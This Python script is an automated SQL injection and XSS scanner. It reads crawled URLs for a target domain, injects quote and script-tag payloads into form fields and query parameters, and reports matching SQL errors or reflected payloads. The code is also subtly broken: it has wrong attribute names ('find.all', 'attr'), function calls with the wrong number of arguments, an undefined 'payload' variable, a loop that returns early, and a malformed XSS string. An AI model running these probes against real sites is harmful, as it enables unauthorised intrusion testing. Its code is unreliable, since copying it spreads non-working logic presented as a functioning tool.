import requests, sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse


session = requests.Session()
session.headers['User-Agent'] = "Paste it here"
session.headers["Cookie"] = ""


def get_forms(url):
    soup = BeautifulSoup(session.get(url).content, 'html.parser')
    return soup.find.all("form")


def form_details(form):
    detailsofform = {}
    try:
        action = form.attrs.get("action").lower()
        method = form.attr.get("method").lower()

        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type")
            input_name = input_tag.attr.get("name")
            input_value = input_tag.attr.get("value", "")
            inputs.append({"type":input_type, "name":input_name, "value": input_value})

        detailsofform['action'] = action
        detailsofform['method'] = method
        detailsofform['inputs'] = inputs
    except:
        pass

    return detailsofform


def submit_form(details, url, data, payload=''):
    url = urljoin(url, details['action'])
    try:
        if details['method'] == 'post':
            res = session.post(url, data=data)
        else:
            res = session.get(url, params=data)
    except:
        res = session.get(url)

    return res


def sqli_vulnerable(res):
    sqli_vuln_errors = ['you have an error in your sql syntax']

    for error in sqli_vuln_errors:
        if error in res.content.decode().lower():
            return True
        return False


def sqli_scan_url(url):
    url = urlparse(url)
    query_string = url.query
    pairs = query_string.split('&')
    for j in range(len(pairs)):
            print(pairs[j])
            pair = [pairs[j].split('=')[0], pairs[j].split('=')[1]+payload]
            pairs[j] = '='.join(pair)
    qs = '&'.join(pairs)
    print("Query string:", qs)
    modified_url = url.geturl().split('?')[0]+'?'+qs
    print("Complete modified url: {}".format(modified_url))
    res = session.get(modified_url)
    return res


def sqli_scan(url):
    forms = get_forms(url)
    print("[+] Found {} forms in {}".format(len(forms), url))

    if len(forms) == 0:
        return

    for form in forms:
        details = form_details(form)

        sqli_payload_list = ['\'', '\"']

        for payload in sqli_payload_list:
            data = {}


            for input_tag in details['inputs']:
                if input_tag['type'] == 'hidden' or input_tag['value']:
                    data[input_tag['name']] = input_tag['value'] + payload
                elif input_tag['type'] != 'submit':
                    data[input_tag['name']] = f"test{payload}"

            res = submit_form(details, url, data, payload)

            if '?' in url:
                res = sqli_scan_url(url, payload)

            if sqli_vulnerable(res):
                print("[+] SQL Injection foundon {}".format(url))
            else:
                pass


def xss_scan_url(url):
    url = urlparse(url)
    query_string = url.query
    pairs = query_string.split('&')
    for j in range(len(pairs)):
            print(pairs[j])
            pair = [pairs[j].split('=')[0], pairs[j].split('=')[1]+payload]
            pairs[j] = '='.join(pair)
    qs = '&'.join(pairs)
    print("Query string:", qs)
    modified_url = url.geturl().split('?')[0]+'?'+qs
    print("Complete modified url: {}".format(modified_url))
    res = session.get(modified_url)
    return res


def xss_scan(url):
    forms = get_forms(url)
    print("[+] Found {} forms in {}".format(len(forms), url))

    if len(forms) == 0:
        return

    js_payload = "<Script>alert('XSS)</scripT>"

    for form in forms:
        details = form_details(form)

        data = {}

        for input_tag in details['inputs']:
            if input_tag['type'] == 'hidden' or input_tag['value']:
                data[input_tag['name']] = input_tag['value'] + js_payload
            elif input_tag['type'] != 'submit':
                data[input_tag['name']] = f"test{js_payload}"

        res = submit_form(details, url, data, js_payload)

        if '?' in url:
            res = xss_scan_url(url, js_payload)

        if js_payload in res.content.decode():
            print("[+] XSS found on {}".format(url))
        else:
            pass


if __name__ == '__main__':
    domain = sys.argv[1]
    with open(f'recon/{domain}/crawler_output', 'r') as file:
        urls = file.read().splitlines()
        for url in urls:
            sqli_scan(url)
            xss_scan(url)